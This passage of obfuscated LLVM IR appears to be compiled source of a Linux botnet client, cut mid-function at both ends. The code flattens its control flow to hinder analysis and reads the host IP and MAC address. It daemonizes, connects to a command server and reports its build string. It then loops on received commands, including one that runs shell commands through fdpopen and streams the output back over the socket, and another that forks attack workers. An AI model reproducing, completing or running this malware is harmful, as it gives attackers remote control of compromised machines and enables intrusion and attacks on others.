  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %53 = call i8* @strstr(i8* %52, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.74, i32 0, i32 0)) #10
  %54 = icmp ne i8* %53, null
  %55 = select i1 %54, i32 -1741846756, i32 385268489
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %57, i8** %9, align 8
  store i32 1835511019, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8*, i8** %9, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp ne i32 %61, 9
  %63 = select i1 %62, i32 -1826415965, i32 545992941
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8*, i8** %9, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %9, align 8
  store i32 1835511019, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8*, i8** %9, align 8
  store i8 0, i8* %68, align 1
  store i32 -1689821568, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 4096, i32 16, i1 false)
  store i32 -603256167, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %7, align 4
  %73 = call i32 @close(i32 %72)
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %75 = load i8, i8* %74, align 16
  %76 = icmp ne i8 %75, 0
  %77 = select i1 %76, i32 -1062038256, i32 -600416121
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %80 = bitcast %union.anon.6* %79 to [16 x i8]*
  %81 = getelementptr inbounds [16 x i8], [16 x i8]* %80, i32 0, i32 0
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %83 = call i8* @strcpy(i8* %81, i8* %82) #4
  %84 = load i32, i32* %2, align 4
  %85 = call i32 (i32, i64, ...) @ioctl(i32 %84, i64 35111, %struct.ifreq* %11) #4
  store i32 0, i32* %10, align 4
  store i32 144608449, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = icmp slt i32 %87, 6
  %89 = select i1 %88, i32 1327123982, i32 -1242546498
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %92 = bitcast %union.anon.7* %91 to %struct.sockaddr*
  %93 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %92, i32 0, i32 1
  %94 = getelementptr inbounds [14 x i8], [14 x i8]* %93, i32 0, i32 0
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = load i32, i32* %10, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %100
  store i8 %98, i8* %101, align 1
  store i32 -1798913154, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %10, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %10, align 4
  store i32 144608449, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 -600416121, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  %108 = call i32 @close(i32 %107)
  store i32 -1701099013, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %1, align 4
  ret i32 %110

loopEnd:                                          ; preds = %106, %105, %102, %90, %86, %78, %71, %69, %67, %64, %58, %56, %51, %45, %40, %39, %32, %31, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #3

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.75, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [4096 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca [1024 x i8], align 16
  %19 = alloca i32, align 4
  %20 = alloca [10 x i8*], align 16
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = call i32 @getpid() #4
  %26 = xor i32 %24, %25
  call void @srand(i32 %26) #4
  %27 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %28 = call i32 @getpid() #4
  %29 = xor i32 %27, %28
  call void @init_rand(i32 %29)
  %30 = call i32 @getOurIP()
  %31 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 1), align 1
  %34 = zext i8 %33 to i32
  %35 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 2), align 1
  %36 = zext i8 %35 to i32
  %37 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 3), align 1
  %38 = zext i8 %37 to i32
  %39 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 4), align 1
  %40 = zext i8 %39 to i32
  %41 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 5), align 1
  %42 = zext i8 %41 to i32
  %43 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.76, i32 0, i32 0), i32 %32, i32 %34, i32 %36, i32 %38, i32 %40, i32 %42)
  %44 = call i32 @fork() #4
  store i32 %44, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %6, align 4
  %switchVar = alloca i32
  store i32 1036227256, i32* %switchVar
  %.reg2mem3 = alloca i1
  %.reg2mem5 = alloca i1
  %.reg2mem7 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1036227256, label %first
    i32 122840855, label %47
    i32 -10235840, label %50
    i32 -1304555300, label %54
    i32 1971511989, label %58
    i32 702499945, label %59
    i32 498852411, label %63
    i32 1020572612, label %64
    i32 -1448498516, label %66
    i32 1169833319, label %67
    i32 -1938808708, label %68
    i32 -945462668, label %70
    i32 927692004, label %71
    i32 -1784272860, label %75
    i32 -1814655751, label %79
    i32 -1148570342, label %82
    i32 -1322673185, label %86
    i32 2131442622, label %92
    i32 -1443187489, label %93
    i32 -85612598, label %99
    i32 -1671292520, label %108
    i32 -470337701, label %111
    i32 677902388, label %117
    i32 -1671153914, label %128
    i32 1414878743, label %131
    i32 -1439849628, label %144
    i32 -365555823, label %150
    i32 -173245944, label %160
    i32 -1945739411, label %163
    i32 -124268888, label %167
    i32 -811770599, label %168
    i32 1493745838, label %171
    i32 1759225977, label %181
    i32 825054747, label %184
    i32 887229883, label %190
    i32 -181194506, label %191
    i32 1277720204, label %198
    i32 624581806, label %201
    i32 833400552, label %207
    i32 -1470200631, label %212
    i32 -1268374570, label %214
    i32 293799640, label %217
    i32 -60950810, label %223
    i32 157810525, label %224
    i32 -2080413160, label %233
    i32 -643218087, label %243
    i32 1830489088, label %252
    i32 1602713295, label %254
    i32 915942608, label %260
    i32 412565179, label %262
    i32 1381508616, label %268
    i32 22753713, label %273
    i32 -1200319801, label %275
    i32 625449036, label %278
    i32 -2018283464, label %283
    i32 -813230376, label %288
    i32 39737058, label %297
    i32 707486339, label %302
    i32 -494787263, label %306
    i32 -1283909475, label %307
    i32 459489014, label %314
    i32 488371315, label %320
    i32 -613243232, label %327
    i32 -761977646, label %330
    i32 1734929181, label %335
    i32 264731781, label %339
    i32 -2111110195, label %345
    i32 1983239081, label %368
    i32 -1437423741, label %370
    i32 1820797353, label %376
    i32 -824962215, label %377
    i32 415146028, label %382
    i32 1640801391, label %387
    i32 -604294540, label %390
    i32 -652645338, label %391
    i32 1063335935, label %392
    i32 -37898191, label %393
    i32 -614830083, label %395
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %45 = icmp ne i32 %.reload, 0
  %46 = select i1 %45, i32 122840855, i32 -10235840
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %6, align 4
  %49 = call i32 @waitpid(i32 %48, i32* %8, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %6, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 -1938808708, i32 -1304555300
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = call i32 @fork() #4
  store i32 %55, i32* %7, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 1971511989, i32 702499945
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %7, align 4
  %61 = icmp ne i32 %60, 0
  %62 = select i1 %61, i32 1020572612, i32 498852411
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  store i32 -1448498516, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i32 0, i32 0))
  store i32 -1448498516, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 1169833319, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 -945462668, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i32 0, i32 0))
  store i32 -945462668, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 927692004, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = call i32 @setsid() #4
  %73 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.78, i32 0, i32 0)) #4
  %74 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #4
  store i32 -1784272860, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = call i32 @initConnection()
  %77 = icmp ne i32 %76, 0
  %78 = select i1 %77, i32 -1814655751, i32 -1148570342
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.79, i32 0, i32 0))
  %81 = call i32 @sleep(i32 5)
  store i32 -1784272860, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* @mainCommSock, align 4
  %84 = call i8* @getBuild()
  %85 = call i32 (i32, i8*, ...) @sockprintf(i32 %83, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i32 0, i32 0), i8* %84)
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  store i32 -1322673185, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* @mainCommSock, align 4
  %88 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %89 = call i32 @recvLine(i32 %87, i8* %88, i32 4096)
  store i32 %89, i32* %10, align 4
  %90 = icmp ne i32 %89, -1
  %91 = select i1 %90, i32 2131442622, i32 -37898191
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -1443187489, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %11, align 4
  %95 = sext i32 %94 to i64
  %96 = load i64, i64* @numpids, align 8
  %97 = icmp ult i64 %95, %96
  %98 = select i1 %97, i32 -85612598, i32 1493745838
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32*, i32** @pids, align 8
  %101 = load i32, i32* %11, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i32, i32* %100, i64 %102
  %104 = load i32, i32* %103, align 4
  %105 = call i32 @waitpid(i32 %104, i32* null, i32 1)
  %106 = icmp sgt i32 %105, 0
  %107 = select i1 %106, i32 -1671292520, i32 -124268888
  store i32 %107, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i32, i32* %11, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %13, align 4
  store i32 -470337701, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %13, align 4
  %113 = zext i32 %112 to i64
  %114 = load i64, i64* @numpids, align 8
  %115 = icmp ult i64 %113, %114
  %116 = select i1 %115, i32 677902388, i32 1414878743
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32*, i32** @pids, align 8
  %119 = load i32, i32* %13, align 4
  %120 = zext i32 %119 to i64
  %121 = getelementptr inbounds i32, i32* %118, i64 %120
  %122 = load i32, i32* %121, align 4
  %123 = load i32*, i32** @pids, align 8
  %124 = load i32, i32* %13, align 4
  %125 = sub i32 %124, 1
  %126 = zext i32 %125 to i64
  %127 = getelementptr inbounds i32, i32* %123, i64 %126
  store i32 %122, i32* %127, align 4
  store i32 -1671153914, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load i32, i32* %13, align 4
  %130 = add i32 %129, 1
  store i32 %130, i32* %13, align 4
  store i32 -470337701, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load i32*, i32** @pids, align 8
  %133 = load i32, i32* %13, align 4
  %134 = sub i32 %133, 1
  %135 = zext i32 %134 to i64
  %136 = getelementptr inbounds i32, i32* %132, i64 %135
  store i32 0, i32* %136, align 4
  %137 = load i64, i64* @numpids, align 8
  %138 = add i64 %137, -1
  store i64 %138, i64* @numpids, align 8
  %139 = load i64, i64* @numpids, align 8
  %140 = add i64 %139, 1
  %141 = mul i64 %140, 4
  %142 = call noalias i8* @malloc(i64 %141) #4
  %143 = bitcast i8* %142 to i32*
  store i32* %143, i32** %12, align 8
  store i32 0, i32* %13, align 4
  store i32 -1439849628, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i32, i32* %13, align 4
  %146 = zext i32 %145 to i64
  %147 = load i64, i64* @numpids, align 8
  %148 = icmp ult i64 %146, %147
  %149 = select i1 %148, i32 -365555823, i32 -1945739411
  store i32 %149, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i32*, i32** @pids, align 8
  %152 = load i32, i32* %13, align 4
  %153 = zext i32 %152 to i64
  %154 = getelementptr inbounds i32, i32* %151, i64 %153
  %155 = load i32, i32* %154, align 4
  %156 = load i32*, i32** %12, align 8
  %157 = load i32, i32* %13, align 4
  %158 = zext i32 %157 to i64
  %159 = getelementptr inbounds i32, i32* %156, i64 %158
  store i32 %155, i32* %159, align 4
  store i32 -173245944, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = load i32, i32* %13, align 4
  %162 = add i32 %161, 1
  store i32 %162, i32* %13, align 4
  store i32 -1439849628, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load i32*, i32** @pids, align 8
  %165 = bitcast i32* %164 to i8*
  call void @free(i8* %165) #4
  %166 = load i32*, i32** %12, align 8
  store i32* %166, i32** @pids, align 8
  store i32 -124268888, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  store i32 -811770599, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i32, i32* %11, align 4
  %170 = add nsw i32 %169, 1
  store i32 %170, i32* %11, align 4
  store i32 -1443187489, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %172 = load i32, i32* %10, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %173
  store i8 0, i8* %174, align 1
  %175 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  call void @trim(i8* %175)
  %176 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %177 = call i8* @strstr(i8* %176, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0)) #10
  %178 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %179 = icmp eq i8* %177, %178
  %180 = select i1 %179, i32 1759225977, i32 825054747
  store i32 %180, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i32, i32* @mainCommSock, align 4
  %183 = call i32 (i32, i8*, ...) @sockprintf(i32 %182, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.81, i32 0, i32 0))
  store i32 -1322673185, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %186 = call i8* @strstr(i8* %185, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.82, i32 0, i32 0)) #10
  %187 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %188 = icmp eq i8* %186, %187
  %189 = select i1 %188, i32 887229883, i32 -181194506
  store i32 %189, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:191:                                    ; preds = %loopEntry
  %192 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  store i8* %192, i8** %14, align 8
  %193 = load i8*, i8** %14, align 8
  %194 = load i8, i8* %193, align 1
  %195 = zext i8 %194 to i32
  %196 = icmp eq i32 %195, 33
  %197 = select i1 %196, i32 1277720204, i32 1063335935
  store i32 %197, i32* %switchVar
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %199 = load i8*, i8** %14, align 8
  %200 = getelementptr inbounds i8, i8* %199, i64 1
  store i8* %200, i8** %15, align 8
  store i32 624581806, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i8*, i8** %15, align 8
  %203 = load i8, i8* %202, align 1
  %204 = zext i8 %203 to i32
  %205 = icmp ne i32 %204, 32
  %206 = select i1 %205, i32 833400552, i32 -1470200631
  store i32 %206, i32* %switchVar
  store i1 false, i1* %.reg2mem3
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %15, align 8
  %209 = load i8, i8* %208, align 1
  %210 = zext i8 %209 to i32
  %211 = icmp ne i32 %210, 0
  store i32 -1470200631, i32* %switchVar
  store i1 %211, i1* %.reg2mem3
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %.reload4 = load i1, i1* %.reg2mem3
  %213 = select i1 %.reload4, i32 -1268374570, i32 293799640
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load i8*, i8** %15, align 8
  %216 = getelementptr inbounds i8, i8* %215, i32 1
  store i8* %216, i8** %15, align 8
  store i32 624581806, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  %218 = load i8*, i8** %15, align 8
  %219 = load i8, i8* %218, align 1
  %220 = zext i8 %219 to i32
  %221 = icmp eq i32 %220, 0
  %222 = select i1 %221, i32 -60950810, i32 157810525
  store i32 %222, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  store i32 -1322673185, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i8*, i8** %15, align 8
  store i8 0, i8* %225, align 1
  %226 = load i8*, i8** %14, align 8
  %227 = getelementptr inbounds i8, i8* %226, i64 1
  store i8* %227, i8** %15, align 8
  %228 = load i8*, i8** %14, align 8
  %229 = load i8*, i8** %15, align 8
  %230 = call i64 @strlen(i8* %229) #10
  %231 = getelementptr inbounds i8, i8* %228, i64 %230
  %232 = getelementptr inbounds i8, i8* %231, i64 2
  store i8* %232, i8** %14, align 8
  store i32 -2080413160, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i8*, i8** %14, align 8
  %235 = load i8*, i8** %14, align 8
  %236 = call i64 @strlen(i8* %235) #10
  %237 = sub i64 %236, 1
  %238 = getelementptr inbounds i8, i8* %234, i64 %237
  %239 = load i8, i8* %238, align 1
  %240 = zext i8 %239 to i32
  %241 = icmp eq i32 %240, 10
  %242 = select i1 %241, i32 1830489088, i32 -643218087
  store i32 %242, i32* %switchVar
  store i1 true, i1* %.reg2mem5
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %244 = load i8*, i8** %14, align 8
  %245 = load i8*, i8** %14, align 8
  %246 = call i64 @strlen(i8* %245) #10
  %247 = sub i64 %246, 1
  %248 = getelementptr inbounds i8, i8* %244, i64 %247
  %249 = load i8, i8* %248, align 1
  %250 = zext i8 %249 to i32
  %251 = icmp eq i32 %250, 13
  store i32 1830489088, i32* %switchVar
  store i1 %251, i1* %.reg2mem5
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  %.reload6 = load i1, i1* %.reg2mem5
  %253 = select i1 %.reload6, i32 1602713295, i32 915942608
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load i8*, i8** %14, align 8
  %256 = load i8*, i8** %14, align 8
  %257 = call i64 @strlen(i8* %256) #10
  %258 = sub i64 %257, 1
  %259 = getelementptr inbounds i8, i8* %255, i64 %258
  store i8 0, i8* %259, align 1
  store i32 -2080413160, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  %261 = load i8*, i8** %14, align 8
  store i8* %261, i8** %16, align 8
  store i32 412565179, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = load i8*, i8** %14, align 8
  %264 = load i8, i8* %263, align 1
  %265 = zext i8 %264 to i32
  %266 = icmp ne i32 %265, 32
  %267 = select i1 %266, i32 1381508616, i32 22753713
  store i32 %267, i32* %switchVar
  store i1 false, i1* %.reg2mem7
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = load i8*, i8** %14, align 8
  %270 = load i8, i8* %269, align 1
  %271 = zext i8 %270 to i32
  %272 = icmp ne i32 %271, 0
  store i32 22753713, i32* %switchVar
  store i1 %272, i1* %.reg2mem7
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %.reload8 = load i1, i1* %.reg2mem7
  %274 = select i1 %.reload8, i32 -1200319801, i32 625449036
  store i32 %274, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i8*, i8** %14, align 8
  %277 = getelementptr inbounds i8, i8* %276, i32 1
  store i8* %277, i8** %14, align 8
  store i32 412565179, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i8*, i8** %14, align 8
  store i8 0, i8* %279, align 1
  %280 = load i8*, i8** %14, align 8
  %281 = getelementptr inbounds i8, i8* %280, i32 1
  store i8* %281, i8** %14, align 8
  %282 = load i8*, i8** %16, align 8
  store i8* %282, i8** %17, align 8
  store i32 -2018283464, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  %284 = load i8*, i8** %17, align 8
  %285 = load i8, i8* %284, align 1
  %286 = icmp ne i8 %285, 0
  %287 = select i1 %286, i32 -813230376, i32 39737058
  store i32 %287, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8*, i8** %17, align 8
  %290 = load i8, i8* %289, align 1
  %291 = zext i8 %290 to i32
  %292 = call i32 @toupper(i32 %291) #10
  %293 = trunc i32 %292 to i8
  %294 = load i8*, i8** %17, align 8
  store i8 %293, i8* %294, align 1
  %295 = load i8*, i8** %17, align 8
  %296 = getelementptr inbounds i8, i8* %295, i32 1
  store i8* %296, i8** %17, align 8
  store i32 -2018283464, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = load i8*, i8** %16, align 8
  %299 = call i32 @strcmp(i8* %298, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.83, i32 0, i32 0)) #10
  %300 = icmp eq i32 %299, 0
  %301 = select i1 %300, i32 707486339, i32 -761977646
  store i32 %301, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = call i32 @listFork()
  %304 = icmp ne i32 %303, 0
  %305 = select i1 %304, i32 -494787263, i32 -1283909475
  store i32 %305, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  store i32 -1322673185, i32* %switchVar
  br label %loopEnd

; <label>:307:                                    ; preds = %loopEntry
  %308 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %308, i8 0, i64 1024, i32 16, i1 false)
  %309 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %310 = load i8*, i8** %14, align 8
  %311 = call i32 (i8*, i8*, ...) @szprintf(i8* %309, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.84, i32 0, i32 0), i8* %310)
  %312 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %313 = call i32 @fdpopen(i8* %312, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0))
  store i32 %313, i32* %19, align 4
  store i32 459489014, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %316 = load i32, i32* %19, align 4
  %317 = call i8* @fdgets(i8* %315, i32 1024, i32 %316)
  %318 = icmp ne i8* %317, null
  %319 = select i1 %318, i32 488371315, i32 -613243232
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  call void @trim(i8* %321)
  %322 = load i32, i32* @mainCommSock, align 4
  %323 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %324 = call i32 (i32, i8*, ...) @sockprintf(i32 %322, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.85, i32 0, i32 0), i8* %323)
  %325 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %325, i8 0, i64 1024, i32 16, i1 false)
  %326 = call i32 @sleep(i32 1)
  store i32 459489014, i32* %switchVar
  br label %loopEnd

; <label>:327:                                    ; preds = %loopEntry
  %328 = load i32, i32* %19, align 4
  %329 = call i32 @fdpclose(i32 %328)
  call void @exit(i32 0) #14
  unreachable

; <label>:330:                                    ; preds = %loopEntry
  store i32 1, i32* %21, align 4
  %331 = load i8*, i8** %14, align 8
  %332 = call i8* @strtok(i8* %331, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0)) #4
  store i8* %332, i8** %22, align 8
  %333 = load i8*, i8** %16, align 8
  %334 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 0
  store i8* %333, i8** %334, align 16
  store i32 1734929181, i32* %switchVar
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
